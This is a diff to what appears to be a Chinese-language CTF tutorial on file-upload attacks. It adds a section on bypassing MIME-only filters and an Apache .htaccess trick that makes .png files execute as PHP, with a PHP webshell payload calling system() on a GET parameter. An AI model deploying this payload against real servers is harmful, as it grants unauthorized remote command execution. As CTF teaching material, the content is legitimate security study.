@@ -15,7 +15,7 @@ difficulty: "advanced"
 tags: ["file-upload", "xxe", "lfi", "path-traversal", "ctf"]
 language: "zh-CN"
 last_updated: "2026-07-04"
-related_articles: ["ctf-website/04-ssrf/ssrf", "ctf-website/03-injection/ssti", "ctf-website/24-database/04-config-exposure", "ctf-website/24-database/05-backup-log-leak", "ctf-website/12-payment/platform-fingerprints", "ctf-website/12-payment/payment-callback-async"]
+related_articles: ["ctf-website/04-ssrf/ssrf", "ctf-website/03-injection/ssti", "ctf-website/24-database/04-config-exposure", "ctf-website/24-database/05-backup-log-leak", "ctf-website/12-payment/payment-callback-async"]
 ---
 # File Upload / XXE / LFI / Path Traversal
 
@@ -127,6 +127,44 @@ MIME_BYPASS = [
     "application/x-php", "", None,
 ]
 ```
+
+关键判据：**校验的是 `$_FILES['type']`（客户端 multipart 里我们自己写的 Content-Type）
+还是服务端嗅探**。前者伪造 MIME 就能放行任意扩展名。
+
+按三种「拒绝话术」反推过滤维度（一次一改，不要混着试）：
+
+| 改 MIME | 改扩展名 | 结论 |
+|---|---|---|
+| 仍拒 | 仍拒 | 双维度都查，找白名单缺口 |
+| 通过 | 仍拒 | 只查扩展名（黑名单/白名单） |
+| 通过 | 通过 | **只查 MIME** → 任意扩展名可落盘 |
+
+### `.htaccess` 提权（Apache 上传点专用）
+
+只查 MIME 的站点上，`.htaccess` 的 `pathinfo(..., PATHINFO_EXTENSION)` 是 `htaccess`，
+通常不在 `['php','phtml','phar',...]` 黑名单里；而落盘目录若 `AllowOverride` 开启，
+Apache 会把它当**目录配置**读。
+
+```python
+# 1) 上传 .htaccess，客户端 MIME 报 image/png
+HTACCESS = b"AddType application/x-httpd-php .png\nAddType application/x-httpd-php .jpg\n"
+
+# 2) 上传 sh.png：PNG 魔数 + PHP 马，MIME 也报 image/png
+SHELL = b'<?php echo "AE"."GIS_OK\\n"; system($_GET["c"]); ?>'
+
+# 3) GET /uploads/<hex>/sh.png?c=id  -> uid=33(www-data)
+```
+
+判断是否真的生效：
+
+- `.htaccess` 落盘后**直接访问该 URL 返回 HTTP 500** = Apache 在解析它（内容非法）→ 目录确实读 `.htaccess`。
+- 上传目录通常是 `uploads/<session 随机 hex>/`，**同一次会话（PHPSESSID）内两次上传落同一目录**，
+  所以 `.htaccess` 与马必须用同一个 cookie jar 发。
+- 先传 `.htaccess` 再传马；顺序反了不影响，但一旦写入非法 `.htaccess`，该目录会持续 500，
+  此时换新会话拿新目录重来。
+
+旁证：未知扩展名若统一返回 `DefaultType`（如全部 `image/png`），说明站点作者做了兜底
+MIME，不要据此误判 `.pht/.phps` 之类会被当脚本执行 —— 必须回读文件内容确认。
 
 ### 解析器差异与文件名规范化
 
